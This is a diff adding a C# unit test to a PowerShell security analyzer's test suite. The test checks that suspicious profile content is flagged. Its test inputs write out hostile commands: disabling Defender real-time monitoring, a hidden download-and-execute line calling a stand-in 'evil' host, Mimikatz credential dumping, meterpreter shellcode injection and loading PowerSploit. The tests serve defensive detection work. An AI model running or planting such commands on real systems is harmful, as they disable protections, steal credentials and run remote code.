@@ -702,6 +702,20 @@ public class PowerShellSecurityAnalyzerTests
         Assert.Contains("AMSI", f.Description);
     }
 
+    [Theory]
+    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true", "real-time")]
+    [InlineData("powershell -NoProfile -w hidden -c iex(irm http://evil/p)", "ignoring profiles")]
+    [InlineData("Invoke-Mimikatz -DumpCreds", "Invoke-Mimikatz")]
+    [InlineData("Invoke-Shellcode -Payload windows/meterpreter", "Invoke-Shellcode")]
+    [InlineData("Import-Module PowerSploit", "PowerSploit")]
+    public void CheckProfiles_KnownOffensiveTokens_AreFlagged(string content, string expectedReasonSubstring)
+    {
+        var state = new PowerShellState { Profiles = { Profile(content) } };
+        var f = Assert.Single(CheckProfiles(state));
+        Assert.Equal(Severity.Warning, f.Severity);
+        Assert.Contains(expectedReasonSubstring, f.Description);
+    }
+
     [Fact]
     public void CheckProfiles_MultipleProfiles_GradesEachIndependently()
     {
